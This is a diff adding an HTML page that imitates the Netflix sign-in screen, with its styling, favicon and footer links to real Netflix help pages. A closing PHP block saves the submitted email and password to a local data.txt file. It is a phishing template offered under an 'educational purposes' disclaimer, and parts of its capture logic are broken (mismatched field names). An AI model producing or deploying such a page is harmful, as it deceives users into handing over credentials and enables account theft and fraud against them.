@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html> 
+<head>
+<!--Author: @new92-->
+<!--This page has been created only for educational purposes !! The author is not responsible for any illegal actions carried out using this page-->
+<title>Netflix</title>
+<link rel="icon" type="image/x-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+<style>
+html {
+	font-family: sans-serif;
+}
+body {
+	background-image: url("background1.jpg");
+	background-repeat: no-repeat;
+	background-position: left center;
+	font-family: sans-serif;
+}
+
+.footer {
+	background-color: #000000DF;
+	position: fixed;
+	bottom: 0px;
+	left: 0px;
+	width: 100%;
+	color: #757575;
+	height: 250px;
+	font-size: 16px;
+}
+
+.login {
+	background-color: #000000DF;
+	width: 20%;
+	padding: 60px 68px 40px;
+	margin: auto;
+	height: 500px;
+}
+
+.logo {
+	width: 190px;
+	height: 58px;
+	left: 40px;
+	position: absolute;
+	margin-top: 10px;
+}
+
+.logo:hover {
+	cursor: pointer;
+}
+
+.signup {
+	font-size: 17px;
+	color: white;
+	text-decoration: none;
+}
+
+.signup:hover {
+	text-decoration: underline;
+}
+
+.recaptcha {
+	font-size: 13px;
+	color: #8c8c8c;
+	margin-top: 10px;
+}
+
+.email {
+	background-color: #333333;
+	color: white;
+	height: 46px;
+	width: 295px;
+	border-radius: 5px;
+	border: 1px solid #333333;
+}
+
+.email:focus-visible {
+	outline: 1px solid #333333;
+} 
+
+.password {
+	background-color: #333333;
+	color: white;
+	height: 48px;
+	width: 295px;
+	border-radius: 5px;
+	border: 1px solid #333333;
+}
+
+.password:focus-visible {
+	outline: 1px solid #333333;
+}
+
+.connect {
+	background-color: #e50914;
+	height: 44px;
+	width: 295px;
+	color: white;
+	font-size: 16px;
+	font-family: Sans-serif;
+	font-weight: bold;
+	border-radius: 5px;
+}
+
+.connect:hover {
+	cursor: pointer;
+}
+
+.log {
+	color: white;
+	font-family: sans-serif;
+	font-size: 30px;
+	font-weight: bold;
+	margin-top: 9px;
+	margin-left: 2px;
+}
+
+* {
+	margin: 0;
+}
+html, body {
+	height: 100%;
+}
+.page-wrap {
+  min-height: 100%;
+	margin-bottom: -230px; 
+}
+.page-wrap:after {
+  content: "";
+  display: block;
+}
+.site-footer, .page-wrap:after {
+	height: 220px; 
+}
+.site-footer {
+  background-color: #000000DF;
+}
+
+.contactus {
+	color: #757575;
+	font-size: 17px;
+	margin-top: 30px;
+	left: 267px;
+	position: absolute;
+	text-decoration: none;
+}
+
+.contactus:hover {
+	text-decoration: underline;
+}
+
+.comquest {
+	color: #757575;
+	font-size: 13px;
+	margin-top: 77px;
+	left: 267px;
+	position: absolute;
+	text-decoration: none;
+}
+
+.comquest:hover {
+	text-decoration: underline;
+}
+
+.cookies {
+	color: #757575;
+	font-size: 13px;
+	margin-top: 109px;
+	left: 267px;
+	position: absolute;
+	cursor: not-allowed;
+	text-decoration: none;
+}
+
+.cookies:hover {
+	text-decoration: underline;
+}
+
+.helpcenter {
+	color: #757575;
+	font-size: 13px;
+	margin-top: 77px;
+	left: 500px;
+	position: absolute;
+	text-decoration: none;
+}
+
+.helpcenter:hover {
+	text-decoration: underline;
+}
+
+.corpinfo {
+	color: #757575;
+	font-size: 13px;
+	margin-top: 109px; 
+	left: 500px;
+	position: absolute;
+	text-decoration: none;
+}
+
+.corpinfo:hover {
+	text-decoration: underline;
+}
+
+.terms {
+	color: #757575;
+	font-size: 13px;
+	margin-top: 77px;
+	left: 733px;
+	position: absolute;
+	text-decoration: none;
+}
+
+.terms:hover {
+	text-decoration: underline;
+}
+
+.privacy {
+	color: #757575;
+	font-size: 13px;
+	margin-top: 77px;
+	left: 966px;
+	position: absolute;
+	text-decoration: none;
+}
+
+.privacy:hover {
+	text-decoration: underline;
+}
+
+.needhelp {
+	font-size: 13px;
+	text-decoration: none;
+	margin-left: 120px;
+}
+
+.needhelp:hover {
+	text-decoration: underline;
+}
+
+.rememberme {
+	font-size: 13px;
+	color: #B3B3B3;
+}
+
+.lmore {
+	color: #0071eb;
+	text-decoration: none;
+	margin-left: 70px;
+	margin-top: 50px;
+}
+
+.lmore:hover {
+	text-decoration: underline;
+}
+</style>
+</head> 
+<body>
+<img class="logo" src="logo.png"/>
+<br>
+<br>
+<div class="login">
+	<h1 class="log">Sign In</h1>
+	<br>
+	<form action="connect.html" method="post"><center>
+	<label for="email"></label> 
+	<input style="font-size: 16px;" class="email" type="email" name="email" placeholder="  Email or phone number" required="required">
+	<br>
+	<br>
+	<label for="password"></label>
+	<input style="font-size: 16px;" class="password" type="password" placeholder="  Password" required="required" minlength="4" maxlength="60">
+	<br>
+	<br>
+	<br>
+	<input class="connect" type="submit" value="Sign In">
+	<br>
+	<br>
+	<input type="checkbox" checked>
+	<label class="rememberme">Remember me</label>
+	<a class="needhelp" href="https://www.netflix.com/LoginHelp" target="_blank" style="color:#B3B3B3">Need help?</a>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<p style="color: #737373; margin-left: -70px; margin-top: -60px;">New to Netflix?<a href="https://www.netflix.com/" class="signup" target="_blank"> Sign up now</a>.</p>
+	<div class="recaptcha">
+	<p>This page is protected by Google reCAPTCHA to<p style="margin-left: -145px;"> ensure you're not a bot.</p><a href="https://policies.google.com/privacy" class="lmore" target="_blank"> Learn more.</a></p>
+	</div>
+	</center>
+	<div class="expand">
+	<br>
+	</div>
+	</form>
+</div>
+<br>
+<br>
+<br>
+<br>
+<footer class="site-footer">
+<a href="https://help.netflix.com/contactus" target="_blank" class="contactus">Questions? Contact us.</a>
+<a href="https://help.netflix.com/node/412" target="_blank" class="comquest">FAQ</a>
+<a href="forbidden.html" target="_blank" class="cookies">Cookie Preferences</p>
+<a href="https://help.netflix.com/" target="_blank" class="helpcenter">Help Center</a>
+<a href="https://help.netflix.com/legal/corpinfo" target="_blank" class="corpinfo">Corporate Information</a>
+<a href="https://help.netflix.com/legal/termsofuse" target="_blank" class="terms">Terms of Use</a>
+<a href="https://help.netflix.com/legal/privacy" target="_blank" class="privacy">Privacy</a>
+</footer>
+
+<?php 
+if(isset($_POST['Sign In'])){
+$email = "Email: ".$_POST['email']."
+";
+$password = "Password: ".$_POST['password']."
+";
+$file=fopen("data.txt","w");
+fwrite($file, $email);
+fwrite($file, $password);
+fclose($file);
+}
+?>
+</body> 
+</html>
